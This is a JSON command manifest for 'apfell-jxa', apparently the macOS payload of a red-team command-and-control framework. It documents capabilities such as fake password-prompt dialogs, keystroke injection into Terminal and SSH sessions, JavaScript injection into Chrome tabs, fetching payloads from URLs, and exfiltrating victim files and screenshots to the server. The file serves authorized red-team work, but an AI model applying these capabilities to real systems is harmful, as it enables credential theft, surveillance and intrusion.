{
  "payload_types": [
    {
      "name": "apfell-jxa",
      "commands": [
        {
          "cmd": "shell",
          "description": "This runs {command} in a terminal by leveraging JXA's Application.doShellScript({command})",
          "help_cmd": "shell {command}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "jscript",
          "description": "This runs the JavaScript command, {command}, and returns its output. If you're trying to do ObjC commands and expect native types to come back, use the jsb (javscript bridge) command.",
          "help_cmd": "jscript {command}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "jsb",
          "description": "This runs the JavaScript (objectiveC) bridge command, {command}, and returns its output. This will call deepunwrap on the output to convert the ObjectiveC objects to normal strings to be returned.",
          "help_cmd": "jsb {command}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "shell_elevated",
          "description": "The command will use your prompt to pop a dialog box for the user asking for them to input their password so that the command you entered will be executed in an elevated context (prompt string is required in this case). Alternatively, you can supply a username and password and the command will run under their context (assuming they have the right permissions). From the UI, just type \"shell_elevated\" and you'll be prompted for the required paramters",
          "help_cmd": "From the GUI: shell_elevated. From RESTful interface: shell_elevated {\"command\":\"whoami\",\"prompt\":\"my fake prompt\", \"use_creds\": \"false\"}",
          "needs_admin": "false",
          "parameters": [
            {
              "name": "command",
              "isString": "true",
              "hint": "Command to execute",
              "required": "true"
            },
            {
              "name": "use_creds",
              "isString": "false",
              "required": "true"
            },
            {
              "name": "user",
              "isString": "true",
              "hint": "Username that you want to run as",
              "isCredential": "true",
              "required": "false"
            },
            {
              "name": "credential",
              "isString": "true",
              "hint": "The user's password",
              "isCredential": "true",
              "required": "false"
            },
            {
              "name": "prompt",
              "isString": "true",
              "hint": "What prompt to display to the user when asking for permission",
              "required": "false"
            }
          ]
        },
        {
          "cmd": "shell_api",
          "description": "This creates two popup dialogs prompting for a full binpath and then arguments for that binary. The command uses the ObjectiveC bridge to spawn that process with those arguments on the computer and get your output back. It is not interactive.",
          "help_cmd": "From the GUI: shell_api. From the cmd-line: shell_api {\"path\":\"/bin/ps\",\"args\":[\"-ax\"]}",
          "needs_admin": "false",
          "parameters": [
            {
              "name": "path",
              "isString": "true",
              "required": "true",
              "hint": "Full path to binary to execute"
            },
            {
              "name": "args",
              "isString": "true",
              "hint": "List of arguments separated by spaces to pass to the binary in \"path\"",
              "required": "false"
            }
          ]
        },
        {
          "cmd": "launchapp",
          "description": "This uses the Objective C bridge to launch the specified app asynchronously and 'hidden' (it'll still show up in the dock for now). An example of the bundle name is 'com.apple.itunes' for launching iTunes.",
          "help_cmd": "launchapp {bundle name}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "clipboard",
          "description": "This will return the current clipboard contents on the target machine. If [data] is supplied, it will set the clipboard to [data].",
          "help_cmd": "clipboard [data]",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "list_apps",
          "description": "This uses JXA to list the currently running processes on the system and provides some information about them. To get a lot of information, use the [verbose] optional parameter.",
          "help_cmd": "list_apps with optional {\"method\": api, \"verbose\": false}",
          "needs_admin": "false",
          "parameters": [
            {
              "name": "method",
              "isString": "true",
              "hint": "default is api, can specify jxa",
              "required": "false"
            },
            {
              "name": "verbose",
              "isString": "false",
              "required": "false"
            }
          ]
        },
        {
          "cmd": "list_users",
          "description": "This uses JXA to list the non-service user accounts on the system. In the future you can specify a [method] to do this via the ObjectiveC bridge or other methods. Right now this defaults to \"api\". You can specify a GID to look at the users of a certain group or you can specify \"groups\" to be true and enumerate users by groups",
          "help_cmd": "list_users with optional: {\"method\": api, \"gid\": 0} or {\"groups\": true}",
          "needs_admin": "false",
          "parameters": [
            {
              "name": "method",
              "isString": "true",
              "hint": "default is api, can specify jxa",
              "required": "false"
            },
            {
              "name": "gid",
              "isString": "true",
              "hint": "GID for a group to enumerate",
              "required": "false"
            },
            {
              "name": "groups",
              "isString": "false",
              "required": "false"
            }
          ]
        },
        {
          "cmd": "current_user",
          "description": "This uses JXA to list information about the current user. In the future you can specify a [method] to do this via the ObjectiveC bridge or other methods. Right now this defaults to \"jxa\".",
          "help_cmd": "current_user with optional {\"method\": \"api\"}",
          "needs_admin": "false",
          "parameters": [
            {
              "name": "method",
              "isString": "true",
              "required": "false",
              "hint": "default is api, can specify jxa"
            }
          ]
        },
        {
          "cmd": "security_info",
          "description": "This uses JXA to list some security information about the system. In the future you can specify a [method] to do this via the ObjectiveC bridge or other methods. Right now this defaults to \"jxa\".",
          "help_cmd": "security_info [method]",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "chrome_tabs",
          "description": "This uses JXA to list information about all of the open tabs in all of the open Chrome instances. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome tabs as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running.",
          "help_cmd": "chrome_tabs",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "chrome_bookmarks",
          "description": "This uses JXA to list information about all of the bookmarks in Chrome. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome's bookmarks as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running.",
          "help_cmd": "chrome_bookmarks",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "js_chrome",
          "description": "This uses JXA to execute the specified JavaScript code into a specific browser tab. The chrome_tabs function will specify for each tab the window/tab numbers that you can use for this function. Note: by default this ability is disabled in Chrome now, you will need to go to view->Developer->Allow JavaScript from Apple Events.",
          "help_cmd": "js_chrome {window ID number} {tab ID number} {JavaScript}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "system_info",
          "description": "This uses JXA to get some system information. In the future you can specify a [method] to do this via the ObjectiveC bridge or other methods. Right now this defaults to \"jxa\"",
          "help_cmd": "system_info [method]",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "terminals_read",
          "description": "This uses JXA to read information about open instances of Apple's Terminal.app. The contents flag allows you to see exactly what the user can see at that moment on the screen. The history flag allows you to see everything that's in that tab's scroll history. This can be a lot of information, so keep that in mind. This function will also give you the window/tab information for each open session and a bunch of other information.",
          "help_cmd": "terminals_read [history] [contents]",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "terminals_send",
          "description": "This uses JXA to inject the shell command, {command}, into the specified terminal shell as if the user typed it from the keyboard. This is pretty powerful. Consider the instance where the user is SSH-ed into another machine via terminal - with this you can inject commands to run on the remote host. Just remember, the user will be able to see the command, but you can always see what they see as well with the \"terminals_read contents\" command.",
          "help_cmd": "terminals_send {window ID number} {tab ID number} {command}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "spawn",
          "description": "This pulls down the payload specified by {url} and uses the shell_api to execute it in a background process. Right now this requires the \"shell_api\" command to also be loaded",
          "help_cmd": "spawn shell_api oneliner apfell-jxa {url}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "download",
          "description": "Download a file from the victim machine to the apfell server in chunks. It will be saved to app/files/{operation name}/downloads/{hostname}/{filename}",
          "help_cmd": "download {path to remote file}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "upload",
          "description": "Take a file from the database and store it on disk through the callback.",
          "help_cmd": "upload \"{path to local file}\" \"{path to remote location}\" (you MUST suround the paths with quotes).",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "sleep",
          "description": "Modify the time between callbacks.",
          "help_cmd": "sleep {integer interval}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "clear",
          "description": "Clears all tasks scheduled for the specific callback that you scheduled. Only an admin can clear tasks schedule by other members on the team.",
          "help_cmd": "clear {all | id_number}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "tasks",
          "description": "View all tasks that are submitting or processing.",
          "help_cmd": "tasks",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "exit",
          "description": "This exits the current apfell-jxa instance by leveraging the ObjectiveC bridge's NSApplication terminate function.",
          "help_cmd": "exit",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "load",
          "description": "This loads a new function into memory via the C2 channel to be used by the operator. The code will be base64 encoded and sent down with the task.",
          "help_cmd": "load {registered_cmd_name}",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "get_config",
          "description": "Gets the current running config via the C2 class",
          "help_cmd": "get_config",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "screencapture",
          "description": "Use the built-in screencapture binary to take a png screenshot, store it in the clipboard, and send it back over the C2 channel",
          "help_cmd": "screencapture [bar]",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "plist",
          "description": "Read plists and their associated attributes for attempts to privilege escalate",
          "help_cmd": "read one file: plist {\"type\": \"read\", \"filename\": \"full_path\"}, read all plists: plist {\"type\": [\"readLaunchAgents\" | \"readLaunchDaemons\"]}",
          "needs_admin": "false",
          "parameters": [
            {
              "name": "type",
              "isString": "true",
              "hint": "readLaunchAgents | readLaunchDaemons | read",
              "required": "true"
            },
            {
              "name": "filename",
              "isString": "true",
              "hint": "full filename path if type is just read",
              "required": "false"
            }
          ]
        },
        {
          "cmd": "cat",
          "description": "Read the contents of a file and display it to the user",
          "help_cmd": "cat /path/to/file",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "ls",
          "description": "Get attributes about a file and display it to the user",
          "help_cmd": "ls /path/to/file",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "test_password",
          "description": "Tests a password against a user to see if it's valid",
          "help_cmd": "test_password with no args uses blank password and current user. or, test_password {\"username\": \"bob\", \"password\": \"bob\"}",
          "needs_admin": "false",
          "parameters": [
            {
              "name": "username",
              "isString": "true",
              "hint": "user's POSIX name",
              "required": "false"
            },
            {
              "name": "password",
              "isString": "true",
              "hint": "user's password",
              "required": "false"
            }
          ]
        },
        {
          "cmd": "jsimport",
          "description": "import a JS file into memory from a remote address. Only one can be imported at a time.",
          "help_cmd": "jsimport https://domain.com/file/to/import",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "jsimport_call",
          "description": "call a function from within the JS file that was imported with \"jsimport\". This function call is appended to the end of the jsimport code and called via eval.",
          "help_cmd": "jsimport_call Get_DomainUser({help=true});",
          "needs_admin": "false",
          "parameters": []
        },
        {
          "cmd": "prompt",
          "description": "Create a custom prompt to ask the user for credentials",
          "help_cmd": "prompt with optional title, icon, text, default answer",
          "needs_admin": "false",
          "parameters": [
            {
              "name": "title",
              "isString": "true",
              "required": "false",
              "hint": "Title of the dialog box"
            },
            {
              "name": "icon",
              "isString": "true",
              "required": "false",
              "hint": "full path to .icns file to use"
            },
            {
              "name": "text",
              "isString": "true",
              "required": "false",
              "hint": "Additional descriptive text to display"
            },
            {
              "name": "answer",
              "isString": "true",
              "required": "false",
              "hint": "Default answer to prepopulate (will show up as *****)"
            }
          ]
        }
      ]
    }
  ]
}